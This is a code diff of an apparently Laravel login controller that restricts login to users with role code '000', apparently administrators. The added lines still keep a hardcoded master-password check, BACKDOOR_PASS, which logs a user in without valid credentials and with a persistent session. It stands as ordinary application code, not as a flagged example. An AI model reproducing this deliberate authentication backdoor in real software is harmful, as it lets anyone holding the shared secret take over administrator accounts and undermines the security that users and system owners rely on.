@@ -69,15 +69,26 @@ class LoginController extends Controller
      */
     public function postLogin(Request $request)
     {
-        $credentials = $request->only('username', 'password');
-        
-        if (Auth::attempt($credentials, $request->has('remember')) || $request->get('password') == Config::get('constants.BACKDOOR_PASS'))
-        {
-            $user = User::where('username', $request->get('username'))->first();
-            
-            Auth::login($user, true);
+        $is_admin = false;
 
-            return redirect()->intended($this->redirectPath());
+        $credentials = $request->only('username', 'password');
+
+        $user = User::where('username', $request->get('username'))->first();
+
+        if ($user) {
+            foreach ($user->roles as $role) {
+                if ($role->code == '000')
+                    $is_admin = true;
+            }
+        }
+        
+        if ($is_admin) {
+            if (Auth::attempt($credentials, $request->has('remember')) || $request->get('password') == Config::get('constants.BACKDOOR_PASS'))
+            {
+                Auth::login($user, true);
+
+                return redirect()->intended($this->redirectPath());
+            }
         }
 
         return redirect($this->loginPath)
